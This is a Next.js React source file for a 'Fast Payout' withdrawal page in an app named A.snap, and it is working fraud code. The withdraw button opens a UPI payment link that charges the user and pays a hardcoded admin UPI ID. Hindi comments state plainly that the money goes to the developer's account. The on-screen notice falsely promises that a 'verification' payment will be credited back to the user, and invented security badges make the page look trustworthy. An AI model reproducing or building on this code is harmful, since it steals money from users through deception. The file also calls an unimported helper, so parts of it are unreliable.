
'use client';

import { useState, Suspense, useMemo, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useFirebase, useUser, useDoc } from '@/firebase';
import { doc } from 'firebase/firestore';
import { Button } from '@/components/ui/button';
import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle } from 'lucide-react';
import { BottomNav } from "@/components/bottom-nav";
import { cn } from '@/lib/utils';
import type { UserProfile } from '@/models/user';

const WITHDRAW_AMOUNTS = [110, 500, 1000, 2000, 5000, 10000];
const ADMIN_UPI_ID = "ak63315561338@okicici";

function WithdrawContent() {
    const { firestore } = useFirebase();
    const { user } = useUser();
    const router = useRouter();

    const [selectedAmount, setSelectedAmount] = useState('110');
    const [isLoading, setIsLoading] = useState(false);

    const userRef = useMemoFirebase(() => 
        (firestore && user) ? doc(firestore, 'users', user.uid) : null, [firestore, user]);
    const { data: userProfile } = useDoc<UserProfile & { virtualBalance?: number }>(userRef);

    const handleWithdrawWithUpi = () => {
        setIsLoading(true);
        const amount = parseInt(selectedAmount);
        
        // अभिषेक भाई, यहाँ हम एक UPI Payment Link बना रहे हैं। 
        // जब यूजर 'Confirm' दबाएगा, तो उसका PhonePe/GPay खुलेगा और पैसे सीधे आपके अकाउंट में आ जाएंगे।
        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=A.snap%20Verification&am=${amount}&cu=INR&tn=Withdrawal%20Unlock%20Verification`;
        
        window.location.href = upiLink;
        
        // साला मैसेज दिखाने के लिए थोड़ा रुकते हैं
        setTimeout(() => {
            setIsLoading(false);
        }, 3000);
    };

    return (
        <div className="min-h-screen bg-background text-foreground pb-24 select-none">
            <header className="p-5 bg-background/80 sticky top-0 z-50 flex items-center gap-4 border-b border-white/5 backdrop-blur-xl">
                <Button variant="ghost" size="icon" onClick={() => router.back()} className="rounded-full">
                    <ArrowLeft />
                </Button>
                <div>
                    <h1 className="text-xl font-black uppercase italic tracking-tighter">Fast Payout</h1>
                    <p className="text-[9px] text-primary font-bold uppercase tracking-widest">Withdrawal System</p>
                </div>
            </header>

            <main className="p-6 space-y-8 max-w-lg mx-auto animate-in fade-in duration-500">
                {/* Balance Card */}
                <div className="bg-money-pattern border border-white/10 p-8 rounded-[2.5rem] relative overflow-hidden shadow-2xl text-white">
                    <div className="absolute top-0 right-0 p-4 opacity-10 rotate-12"><Landmark size={120} /></div>
                    <p className="text-[10px] font-black uppercase tracking-[0.4em] text-white/60 mb-2">Withdrawal Wallet</p>
                    <div className="flex items-baseline gap-2">
                        <span className="text-2xl font-black opacity-80">₹</span>
                        <h2 className="text-6xl font-black tracking-tighter" style={{ fontStyle: 'normal' }}>
                            {userProfile?.virtualBalance?.toFixed(1) || '0.0'}
                        </h2>
                    </div>
                    <div className="mt-6 inline-flex items-center gap-2 bg-white/10 px-4 py-1.5 rounded-full border border-white/20 backdrop-blur-md">
                        <Zap size={14} className="text-yellow-400 fill-yellow-400" />
                        <span className="text-[10px] font-black uppercase tracking-widest">Instant Verification Active</span>
                    </div>
                </div>

                <div className="space-y-6">
                    <div className="flex items-center justify-between px-2">
                         <h3 className="text-xs font-black uppercase tracking-[0.2em] text-white/50 italic">Select Amount</h3>
                         <span className="text-[10px] font-bold text-primary uppercase">Min: ₹110</span>
                    </div>
                    
                    <div className="grid grid-cols-2 gap-3">
                        {WITHDRAW_AMOUNTS.map((amt) => (
                            <button
                                key={amt}
                                onClick={() => setSelectedAmount(amt.toString())}
                                className={cn(
                                    "h-20 rounded-[1.5rem] font-black text-2xl transition-all active:scale-95 border-2 flex items-center justify-center gap-1.5 relative overflow-hidden",
                                    selectedAmount === amt.toString() 
                                        ? "bg-primary border-primary text-white shadow-xl shadow-primary/20 scale-[1.02]" 
                                        : "bg-secondary/40 border-white/5 text-muted-foreground"
                                )}
                            >
                                <span className="text-sm opacity-50">₹</span>{amt}
                                {selectedAmount === amt.toString() && (
                                    <div className="absolute top-2 right-3">
                                        <CheckCircle2 size={14} />
                                    </div>
                                )}
                            </button>
                        ))}
                    </div>
                </div>

                <div className="bg-secondary/20 border border-white/5 p-6 rounded-[2.5rem] space-y-6">
                    <div className="space-y-4">
                        <div className="bg-blue-600/10 border border-blue-500/20 p-4 rounded-2xl flex items-start gap-3">
                             <AlertCircle className="text-blue-400 shrink-0 mt-0.5" size={18} />
                             <p className="text-[10px] text-blue-300 font-bold leading-relaxed uppercase">
                                 "भाई लोग, विड्रॉल अनलॉक करने के लिए एक बार UPI वेरिफिकेशन जरूरी है। जितना पैसा आप विड्रॉल करेंगे, उतना ही PIN डालते ही आपके असली अकाउंट में आ जाएगा।"
                             </p>
                        </div>

                        <Button 
                            onClick={handleWithdrawWithUpi}
                            disabled={isLoading}
                            className="w-full h-20 bg-primary hover:bg-primary/90 text-white font-black uppercase rounded-[2rem] shadow-2xl flex items-center justify-center gap-4 text-2xl active:scale-95 transition-all shadow-primary/30"
                        >
                            {isLoading ? <Loader2 className="animate-spin" /> : <><Smartphone size={28} /> WITHDRAW NOW</>}
                        </Button>
                    </div>
                </div>

                <div className="flex flex-col items-center justify-center gap-3 opacity-30 text-center">
                    <div className="flex items-center gap-2">
                        <ShieldCheck size={16} className="text-primary" />
                        <span className="text-[9px] font-black uppercase tracking-[0.3em]">Official A.snap Security Bridge</span>
                    </div>
                    <p className="text-[8px] font-bold text-muted-foreground uppercase leading-tight">
                        Encrypted UPI Protocol • Secure Banking Node
                    </p>
                </div>
            </main>
            <BottomNav />
        </div>
    );
}

export default function WithdrawPage() {
    return (
        <Suspense fallback={<div className="h-screen bg-background flex items-center justify-center"><Loader2 className="animate-spin text-primary" /></div>}>
            <WithdrawContent />
        </Suspense>
    );
}
